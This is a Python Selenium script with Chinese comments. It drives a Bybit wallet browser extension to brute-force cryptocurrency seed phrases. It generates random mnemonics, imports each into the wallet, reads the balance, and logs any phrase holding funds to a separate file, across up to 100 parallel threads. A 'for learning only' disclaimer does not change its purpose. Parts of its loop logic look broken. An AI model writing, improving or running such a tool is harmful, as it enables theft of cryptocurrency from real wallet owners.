
import logging
import os 
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import subprocess
import random
import time

import threading
from mnemonic import Mnemonic
from selenium.webdriver.common.action_chains import ActionChains
logging.getLogger('selenium.webdriver.common.selenium_manager').setLevel(logging.ERROR)

def copy2clip(txt):
    cmd='echo '+txt.strip()+'|clip'
    return subprocess.check_call(cmd, shell=True)
#-------DATA
# 校验助记词是否合法
def is_valid_mnemonic(mnemonic):
    mnemo = Mnemonic("english")
    return mnemo.check(mnemonic)
def load_wordlist():
    with open("english.txt", "r") as file:
        words = file.read().splitlines()
    return words
def generate_mnemonic2():
    mnemo = Mnemonic("english")
    # 生成随机种子
    seed = os.urandom(16)  # 使用 16 字节的随机种子
    # 生成24个助记词
    mnemonic = mnemo.to_mnemonic(seed)
    return mnemonic
# 随机生成12个助记词
def generate_mnemonic():
    wordlist = load_wordlist()  # 加载单词表
    mnemonic = " ".join(random.choice(wordlist) for _ in range(12))  # 随机选择12个单词
    return mnemonic

#-------------

def CHENGXU(auth_code1):


    while True:
        try:
            opt = Options()
            opt.add_argument("--disable-gpu")
            opt.add_argument("--no-sandbox")
            opt.add_argument("--disable-dev-shm-usage")
            opt.add_argument("--disable-software-rasterizer")
            opt.add_argument("--window-size=400,800")
            opt.add_argument("--force-device-scale-factor=0.6")
            opt.add_extension(EXTENSION_PATH)
            driver = webdriver.Chrome(options=opt)
            
            extension_id = 'pdliaogehgdbhbnmkklieghmmjkpigpa'  # 替换为你的扩展ID
            # 打开扩展的 popup 页面
            driver.get(f'chrome-extension://{extension_id}/popup.html')

        
            try:
            
                driver.switch_to.window(driver.window_handles[0]) 
                #导入已有钱包
                elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div[1]/div[2]/button[2]/span')))

            except Exception as e:

                driver.switch_to.window(driver.window_handles[1])
                
                #导入已有钱包
                elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div[1]/div[2]/button[2]/span')))

            #窗口
            driver.execute_script(js, elem)

            
            #输入密码
            WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/main/div[1]/div/input'))).send_keys(password) 
            WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/main/div[2]/div/input'))).send_keys(password) 

            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/footer/div/label/span[1]/span/span')))

            driver.execute_script(js, elem)
    
            #输入完密码点击确认
            #点击确认
            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/footer/button')))
            driver.execute_script(js, elem)
            #选择助记词
            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div/ul/li[1]/div/div/h3')))
        
            driver.execute_script(js, elem)

            #输入助记词
            if auth_code1== "2":
                while True:
                    mnemonic = generate_mnemonic2()
              
                    if is_valid_mnemonic(mnemonic):
              
                        
                        break
            else:
                mnemonic = generate_mnemonic()
                
                    
            copy2clip(mnemonic)

            elem = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//input')))

            #elem = driver.find_element(by = By.XPATH, value= '/html/body/div[2]/div/div/div[2]/div[1]/div/div/div[2]/div[3]/div[1]/input')
                
            elem.send_keys(Keys.CONTROL + 'v')
            time.sleep(1) 
            while True:

                try:
                    #点击确认
                    try:
                        elem = driver.find_element(by = By.XPATH, value= '//*[@id="__plasmo"]/div/section/main/div[2]/div/div[2]/p/span')
                        tishi_list = elem.text.split()
                        tishi = tishi_list[0]
                    except:
                        tishi="无效"
                    if tishi=="助记词有效":
                        elem = driver.find_element(by = By.XPATH, value= '/div/section//div/section//div/section//div/section//div/section//div/section/')
                    mnemonic = generate_mnemonic()
                    copy2clip(mnemonic)
                    
                    elem = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//input')))
                    elem.send_keys(Keys.CONTROL + 'v')
                except Exception as e:
                    #点击导入
                    try:
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/section/main/div[2]/div/div[3]/button')))
                        driver.execute_script(js, elem)
                        elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/section/main/div[2]/button')))
                        driver.execute_script(js, elem)
                    except:
                        time.sleep(5)
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/div/div[3]/button')))
                        driver.execute_script(js, elem)
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/section/main/div[2]/button')))
                        driver.execute_script(js, elem)
                    #点击确认

                    time.sleep(5)
                    elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/div/section/div[1]/div[2]/span')))

                    usd1 = elem.text.split()
                    if usd1[0]=="--":
                        time.sleep(15)
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/div/section/div[1]/div[2]/span')))
                        usd1 = elem.text.split()
                        
                    if usd1[0]=="--":
                        driver.quit()

                    price_str = usd1[0]
                    price_str = price_str.replace('[', '').replace(']', '').replace("'", '').replace('$', '').strip()
                    # 将处理后的字符串转换为浮点数
                    price_float = float(price_str)
                    print(f"助记词:{mnemonic}  余额:{usd1}")


                    if  price_float>0:
                        logging.basicConfig(filename=log_file_path2, level=logging.INFO)                
                        # 在控制台输出和写入日志文件
                        logging.info(f'Bybit" :{mnemonic} "余额":{usd1}')    
    
                    else:
                        logging.basicConfig(filename=log_file_path, level=logging.INFO)                
                        # 在控制台输出和写入日志文件
                        logging.info(f'Bybit" :{mnemonic} "余额":{usd1}')  
                    for handler in logging.root.handlers[:]:
                        handler.close()  # 关闭处理器
                        logging.root.removeHandler(handler)  # 移除处理器

                    while True: 
                        try:

                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/header/a/div/h3')))
                            driver.execute_script(js, elem)
                        except:
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/header/a/div/h3')))
                            driver.execute_script(js, elem)
                        try:
                                
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/button')))
                            driver.execute_script(js, elem)
                        except:
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/button')))
                            driver.execute_script(js, elem)
                        
                        #输入设备密码
                        try:
                            WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[1]/div/input'))).send_keys(password) 
                        except:
                            WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[1]/div/input'))).send_keys(password) 
                        #确认
                        try:

                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/button')))
                            driver.execute_script(js, elem)
                        except:
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/button')))
                            driver.execute_script(js, elem)
                        #导入现有钱包
                        
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div/div[2]/div/h3')))
                        ActionChains(driver).click(on_element=elem).perform()
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div/ul/li/div/div/h3')))
                        driver.execute_script(js, elem)
                        #输入助记词
                        if auth_code1== "2":
                            while True:
                                mnemonic = generate_mnemonic2()
                        
                                if is_valid_mnemonic(mnemonic):
                        
                                    
                                    break
                        else:
                            mnemonic = generate_mnemonic()
                            
                                
                        copy2clip(mnemonic)

                        elem = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//input')))

                        #elem = driver.find_element(by = By.XPATH, value= '/html/body/div[2]/div/div/div[2]/div[1]/div/div/div[2]/div[3]/div[1]/input')
                            
                        elem.send_keys(Keys.CONTROL + 'v')
                        time.sleep(1)
                            
                        while True:

                            try:
                                #点击确认
                                try:
                                    elem = driver.find_element(by = By.XPATH, value= '//*[@id="__plasmo"]/div/section/main/div[2]/div/div[2]/p/span')
                                    tishi_list = elem.text.split()
                                    tishi = tishi_list[0]
                                except:
                                    tishi="无效"

                                if tishi=="助记词有效":
                                    elem = driver.find_element(by = By.XPATH, value= '/div/section//div/section//div/section//div/section//div/section//div/section/')
                                mnemonic = generate_mnemonic()
  


                                copy2clip(mnemonic)
                                
                                elem = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//input')))
                                elem.send_keys(Keys.CONTROL + 'v')

                            except:
                                break
                        #点击导入
                        try:
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/section/main/div[2]/div/div[3]/button')))
                            driver.execute_script(js, elem)
                            elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/button')))
                            driver.execute_script(js, elem)
                        except:
                            time.sleep(5)
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/div/div[3]/button')))
                            driver.execute_script(js, elem)
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/section/main/div[2]/button')))
                            driver.execute_script(js, elem)
                        #点击确认
                        
                        time.sleep(5)
                        
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div[1]/div/section/div[1]/div[2]/span')))
                        usd1 = elem.text.split()
                        
                        if usd1[0]=="--":
                            time.sleep(15)
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div[1]/div/section/div[1]/div[2]/span')))
                            usd1 = elem.text.split()
                            
                        if usd1[0]=="--":
                            driver.quit()
                
                        price_str = usd1[0]
                        price_str = price_str.replace('[', '').replace(']', '').replace("'", '').replace('$', '').strip()
                        # 将处理后的字符串转换为浮点数
                        price_float = float(price_str)
                        print(f"助记词:{mnemonic}  余额:{usd1}")
                        if  price_float>0:
                            logging.basicConfig(filename=log_file_path2, level=logging.INFO)                
                            # 在控制台输出和写入日志文件
                            logging.info(f'Bybit" :{mnemonic} "余额":{usd1}')    
        
                        else:
                            logging.basicConfig(filename=log_file_path, level=logging.INFO)                
                            # 在控制台输出和写入日志文件
                            logging.info(f'Bybit" :{mnemonic} "余额":{usd1}')  
                        for handler in logging.root.handlers[:]:
                            handler.close()  # 关闭处理器
                            logging.root.removeHandler(handler)  # 移除处理器



        except:


            driver.quit()
mmdrza = '''
声明：本程序仅供学习，请勿用于非法用途。                                                                                                 
'''
print(mmdrza)
password = "Aa123456!"

js = "arguments[0].click();"

script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

EXTENSION_PATH = os.path.join(script_dir,"Bybit.crx")
log_file_path=os.path.join(script_dir, "Bybit钱包余额记录.txt")
log_file_path2=os.path.join(script_dir, "Bybit钱包有钱余额记录.txt")

while True:
    auth_code1 = input("请选择：1、单开模式 2、多开模式（点击Enter确认）: ")
    if auth_code1 in ("1", "2"):
        break
    print("请输入数字1或者数字2进行选择！")

if auth_code1 == "2":
    while True:
        auth_code2 = input("请输入多开数量（1~100）（点击Enter确认）: ")
        if auth_code2.isdigit() and 1 <= int(auth_code2) <= 100:
            auth_code2 = int(auth_code2)
            break
        print("请输入数字1~100！")

    # 多进程启动多个 CHENGXU()
    threads = []
    for _ in range(auth_code2):
        
        p = threading.Thread(target=CHENGXU, args=(auth_code1))
        p.daemon= True
        p.start()
        threads.append(p)
        time.sleep(2)
    # 等待所有进程完成（可选）
    while True:
        time.sleep(1)

else:
    CHENGXU(auth_code1)  # 单开模式直接运行一次
